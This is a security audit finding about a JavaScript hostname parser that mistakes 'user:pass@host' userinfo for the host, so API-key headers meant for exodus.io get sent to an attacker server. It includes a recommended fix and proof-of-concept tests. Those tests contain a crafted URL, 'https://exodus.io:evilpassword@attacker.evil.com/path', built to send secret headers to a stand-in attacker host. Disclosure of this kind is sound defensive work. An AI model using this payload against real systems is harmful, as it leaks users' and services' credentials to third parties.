### Title
`hostnameFromString` mis-parses userinfo with a password (`user:pass@host`) as if the "user" part were the host, letting attacker URLs steal EXODUS_HOST-scoped secret headers while the real request goes to attacker infrastructure - (File: `adapters/fetch-factory/src/hostname.js`)

### Summary
`hostnameFromString` finds the first `:` after `://` and treats everything before it as the hostname, without checking whether that colon is actually a userinfo `user:password` separator followed by `@`. This lets an attacker craft a URL like `https://exodus.io:evilpassword@attacker.evil.com/path` where the buggy parser extracts `exodus.io` (a valid, whitelisted host), while the real fetch/runtime (and any WHATWG-compliant `URL` parser) resolves the actual connection host to `attacker.evil.com`. Since `FetchFactory#create()` computes headers from this same raw string via `#buildHeaders` → `getUrlHostname` → `hostnameFromString`, but then forwards that identical raw string to the real `fetchFn`, the EXODUS_HOST-scoped secret headers (e.g. `x-api-key`, `x-exodus-app-id`) get attached to a request that is actually delivered to the attacker's server.

### Finding Description
The vulnerable logic is: [1](#0-0) 

```js
const portIndex = hostname.indexOf(':')
if (portIndex !== -1) {
  hostname = hostname.slice(0, portIndex)
  return isValidHostname(hostname) ? hostname : null
}
```

This branch is checked *before* the `/` (root indicator) branch, and it never verifies whether the colon is a port separator (`host:port`) or a userinfo password separator (`user:password@host`). Per the WHATWG URL Standard, `https://exodus.io:evilpassword@attacker.evil.com/path` is parsed with username `exodus.io`, password `evilpassword`, and host `attacker.evil.com` — the actual network target. But `hostnameFromString` slices at the first `:` and returns `exodus.io`, which passes `isValidHostname` (matches `domainPattern`).

This value flows into: [2](#0-1) 

`getUrlHostname(url)` returns `exodus.io`, which matches the `EXODUS_HOST` key in `this.headerConfigs`, so any headers configured for `exodus.io` (via `setHeaders(headers, [EXODUS_HOST])` or `setDefaultExodusIdentifierHeaders`, e.g. `x-api-key`, `x-exodus-app-id`, `x-exodus-version`, `x-requested-with`) are attached.

Crucially, the exact same raw string is then handed to the real fetch implementation unmodified: [3](#0-2) 

The real `fetchFn` (native `fetch`, following the WHATWG URL parser) will connect to `attacker.evil.com`, not `exodus.io`, so the secret headers computed for `exodus.io` are sent to attacker-controlled infrastructure. There is no origin-binding check comparing the buggy extracted hostname against what the runtime will actually connect to; `isValidHostname` only validates syntax, not that the parsing matches the runtime's authority resolution.

### Impact Explanation
This is a real secret-disclosure primitive: any code path that builds a fetch URL from attacker-influenced input (remote-config-driven endpoint, deeplink-provided API base, or any user/dapp-controlled URL passed into a fetch wrapper built by `FetchFactory`) and calls the wrapped fetch can cause exfiltration of `x-api-key` and Exodus identification headers to an attacker server. This matches the "secret exposure (API key/auth header leak) to attacker-controlled endpoint" impact class described in the question, since the ORIGIN_SCOPING invariant (secret headers only reach the intended host) is broken.

### Likelihood Explanation
Exploitability requires only that some caller pass an attacker-influenced URL string (not a `URL` object or `Request`, which are parsed correctly beforehand) into a fetch instance created by `FetchFactory` that has `exodus.io`- (or another scoped host-) specific header configuration. The crafted string `https://exodus.io:<anything>@attacker.evil.com/...` is trivial to construct and deterministic in effect. Preconditions are exactly as stated in the question (attacker controls the URL string reaching the wrapped fetch call), and the flaw is 100% reproducible since it is a pure parsing-logic bug, not a race condition or timing issue.

### Recommendation
Replace the manual string-slicing hostname parser with the standard `URL`/`URL` WHATWG parser (e.g., `new URL(url).hostname`) so that hostname extraction always matches what the runtime will actually connect to, eliminating any parsing divergence. At minimum, before treating a colon as a port separator, check whether an `@` occurs later in the same authority segment and, if so, strip everything up to and including the last `@` before looking for the host/port boundary — mirroring the WHATWG authority-parsing algorithm (userinfo consumes to the last `@` in the authority component, before port/path detection).

### Proof of Concept
Fuzz/unit test in `adapters/fetch-factory/__tests__/`:
```js
import { getUrlHostname } from '../src/hostname.js'

test('hostname parser must match URL()for userinfo-with-password URLs', () => {
  const malicious = 'https://exodus.io:evilpassword@attacker.evil.com/path'
  const expected = new URL(malicious).hostname // 'attacker.evil.com'
  const actual = getUrlHostname(malicious)
  expect(actual).toBe(expected) // FAILS: actual === 'exodus.io'
})
```
Integration test on `FetchFactory`:
```js
const calls = []
const fakeFetch = (url, opts) => { calls.push({ url, headers: opts.headers }); return Promise.resolve() }
const factory = new FetchFactory(fakeFetch)
factory.setHeaders({ 'x-api-key': 'SECRET' }, [EXODUS_HOST])
const fetchFn = factory.create()

await fetchFn('https://exodus.io:evilpassword@attacker.evil.com/path')

// The request is actually delivered to attacker.evil.com per WHATWG URL parsing,
// yet it carries the exodus.io-scoped secret header.
expect(new URL(calls[0].url).hostname).toBe('attacker.evil.com')
expect(calls[0].headers.get('x-api-key')).toBe('SECRET') // secret leaked to attacker host
```
